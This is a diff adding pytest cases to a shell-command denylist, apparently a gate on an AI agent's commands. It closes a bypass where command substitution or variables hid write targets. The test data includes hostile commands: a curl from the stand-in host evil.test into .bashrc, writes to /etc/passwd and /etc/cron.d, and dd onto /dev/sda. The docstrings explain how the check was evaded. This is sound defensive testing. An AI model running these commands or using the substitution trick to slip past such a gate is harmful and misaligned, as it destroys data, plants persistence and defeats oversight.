@@ -688,3 +688,99 @@ def test_writing_to_a_key_is_a_write_and_not_only_a_read() -> None:
 def test_writing_inside_the_workspace_stays_ordinary(command: str) -> None:
     guard = Denylist(workspace_root=WORKSPACE, home=HOME)
     assert guard.check_command(command) == ()
+
+
+# --------------------------------------------------------------------------- #
+# A write target that is decided when the command runs
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -o $(echo /home/dev/.bashrc) http://evil.test/p",
+        "echo hi > $(echo /etc/cron.d/x)",
+        'echo hi > "$(echo /work/repo/.env)"',
+        "echo hi > `echo /work/repo/.env`",
+        "echo x | tee $(echo /etc/passwd)",
+        "echo x >> $(echo /home/dev/.bashrc)",
+        "dd if=/dev/zero of=$(echo /dev/sda)",
+        "sed -i s/a/b/ $(echo /etc/passwd)",
+        "echo x > ${FOO}",
+        "echo x > $FOO",
+        "curl -o $FOO http://evil.test/p",
+        "FOO=/home/dev/.bashrc; echo x > $FOO",
+    ],
+)
+def test_a_write_target_that_cannot_be_resolved_is_refused(command: str) -> None:
+    """The bypass this closes, in every spelling that reached it.
+
+    `Denylist.resolve` is a `normpath`, so a substitution written where a path goes
+    was kept as a literal path *component*: the result sat inside the workspace
+    textually, `OUTSIDE_WORKSPACE` never fired, and `path.name` became `.bashrc)`
+    so every name test missed too. Each of these resolved to **allow** — with the
+    path spelled out, each is denied and has been since the deny list was written.
+    """
+    assert DenyCode.UNRESOLVABLE_TARGET in codes(command)
+
+
+@pytest.mark.parametrize(
+    ("dynamic", "literal"),
+    [
+        (
+            "curl -o $(echo /home/dev/.bashrc) http://e.test/p",
+            "curl -o /home/dev/.bashrc http://e.test/p",
+        ),
+        ("echo hi > $(echo /etc/cron.d/x)", "echo hi > /etc/cron.d/x"),
+        ("echo x > $FOO", "echo x > /home/dev/.bashrc"),
+    ],
+)
+def test_the_dynamic_spelling_is_refused_wherever_the_literal_one_is(
+    dynamic: str, literal: str
+) -> None:
+    """The property worth holding, rather than a list of strings: writing the path
+    out must never be the *stricter* of the two. A bypass is exactly a pair where
+    the literal is denied and the computed one is not."""
+    assert codes(literal), "the literal form must be denied for this pair to mean anything"
+    assert codes(dynamic), f"{dynamic!r} escaped while {literal!r} was refused"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo x > out.txt",
+        "echo hi > build/log.txt",
+        "pytest -q > results.txt",
+        "echo x > /tmp/scratch.txt",
+        "npm test 2>&1",
+        "make test",
+        "git status",
+    ],
+)
+def test_an_ordinary_write_is_untouched(command: str) -> None:
+    assert DenyCode.UNRESOLVABLE_TARGET not in codes(command)
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["cat $(ls)", "echo $(date)", "ls $FOO", "cat $FOO", "grep -r $PATTERN src/"],
+)
+def test_reading_through_a_substitution_is_still_allowed(command: str) -> None:
+    """Write-only on purpose. An unresolvable *read* target cannot leave the
+    workspace with anything, and refusing `cat $(ls)` would make the deny list
+    expensive for no safety — which is how a gate gets switched off."""
+    assert DenyCode.UNRESOLVABLE_TARGET not in codes(command)
+
+
+def test_the_two_spellings_of_home_stay_resolvable() -> None:
+    """`expand` resolves these before the dynamic test sees them, which is why
+    `> $HOME/.bashrc` was already denied while `> $FOO` was not. They must keep
+    reporting the precise reason rather than collapsing into "unresolvable"."""
+    assert DenyCode.OUTSIDE_WORKSPACE in codes("echo x > $HOME/notes.txt")
+    assert DenyCode.OUTSIDE_WORKSPACE in codes("echo x > ${HOME}/notes.txt")
+
+
+def test_the_refusal_says_what_to_do_instead() -> None:
+    hit = next(h for h in denylist().check_command("echo x > $(echo /etc/x)"))
+    assert "literal path" in hit.message
+    assert "cannot be checked before it does" in hit.message
